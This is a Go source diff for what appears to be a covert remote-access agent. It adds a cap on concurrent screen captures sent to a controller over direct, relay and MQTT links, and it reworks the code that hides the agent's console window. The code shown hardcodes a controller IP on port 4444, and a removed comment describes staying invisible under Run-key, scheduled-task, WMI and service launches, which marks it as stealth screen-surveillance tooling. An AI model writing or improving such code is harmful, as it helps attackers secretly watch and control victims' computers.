@@ -439,6 +439,24 @@ var frameSeq atomic.Uint64
 
 func nextFrameSeq() uint64 { return frameSeq.Add(1) }
 
+// captureSem bounds concurrent screen captures across all transports. A
+// deep UI pipe (10-20 in flight) spawns one goroutine per request; without
+// a bound, a weak remote PC melts under 20 simultaneous full-screen
+// captures + JPEG encodes and effective fps collapses. Full house drops
+// the frame with an empty heartbeat so the UI pipe keeps flowing.
+var captureSem = make(chan struct{}, 3)
+
+func captureSlot() bool {
+	select {
+	case captureSem <- struct{}{}:
+		return true
+	default:
+		return false
+	}
+}
+
+func releaseSlot() { <-captureSem }
+
 // instanceID stably identifies this agent process (hostname-pid) so the
 // controller can tell two processes on one host apart.
 func instanceID() string {
@@ -889,6 +907,11 @@ func (a *agent) connectOnce() error {
 			case protocol.TypeScreenshotRequest:
 			log.Printf("[*] Screenshot requested (quality=%d monitor=%d all=%v scale=%v)", msg.Quality, msg.Monitor, msg.AllMonitors, msg.Scale)
 			go func(quality, monitor int, all bool, scale float64, tiles bool) {
+				if !captureSlot() {
+					_ = a.send(protocol.Message{Type: protocol.TypeScreen})
+					return
+				}
+				defer releaseSlot()
 				if tiles {
 					msgs, err := captureTiled(quality, monitor, all, scale)
 					if err != nil {
@@ -1316,6 +1339,11 @@ func relayListenOnce(a *agent, hn, user, me, caFile string) error {
 			}(msg)
 		case protocol.TypeScreenshotRequest:
 			go func(quality, monitor int, all bool, scale float64, tiles bool) {
+				if !captureSlot() {
+					_ = mout(protocol.Message{Type: protocol.TypeScreen})
+					return
+				}
+				defer releaseSlot()
 				if tiles {
 					msgs, err := captureTiled(quality, monitor, all, scale)
 					if err != nil {
@@ -1521,6 +1549,11 @@ func (a *agent) connectViaMQTT() error {
 			}(msg)
 		case protocol.TypeScreenshotRequest:
 			go func(quality, monitor int, all bool, scale float64, tiles bool) {
+				if !captureSlot() {
+					_ = mout(protocol.Message{Type: protocol.TypeScreen})
+					return
+				}
+				defer releaseSlot()
 				if tiles {
 					msgs, err := captureTiled(quality, monitor, all, scale)
 					if err != nil {
@@ -1751,18 +1784,6 @@ func setupLogFile() {
 }
 
 func main() {
-	// Hide before anything else (even flag parsing) so a slow disk can
-	// never show a flash. Skipped only for explicit interactive runs.
-	hide := true
-	for _, a := range os.Args[1:] {
-		if a == "-test" || a == "--test" || a == "-help" || a == "--help" || a == "-h" {
-			hide = false
-			break
-		}
-	}
-	if hide {
-		hideOwnConsole()
-	}
 	addr := flag.String("controller", "176.229.98.54:4444", "controller address host:port")
 	caFile := flag.String("ca", "certs/server.crt", "CA cert file (server.crt)")
 	insecure := flag.Bool("insecure", false, "skip TLS verification (for testing)")
@@ -1793,11 +1814,12 @@ func main() {
 		}
 	}
 	setupLogFile()
-	// Hide our own console in every non-interactive mode: however this
-	// binary gets launched (Run key, task, WMI, service child,
-	// double-click), no window stays visible. -test/-help keep theirs so
-	// the operator can read the output.
-	if !*testOnly && !*showHelp {
+	// Release builds are windowsgui-subsystem (no console is ever created,
+	// so no flash is possible). Interactive runs attach back to a console
+	// for readable output; everything else hides (belt and suspenders).
+	if *testOnly || *showHelp || *persist {
+		ensureInteractiveConsole()
+	} else {
 		hideOwnConsole()
 	}
 	if *svcHeal {
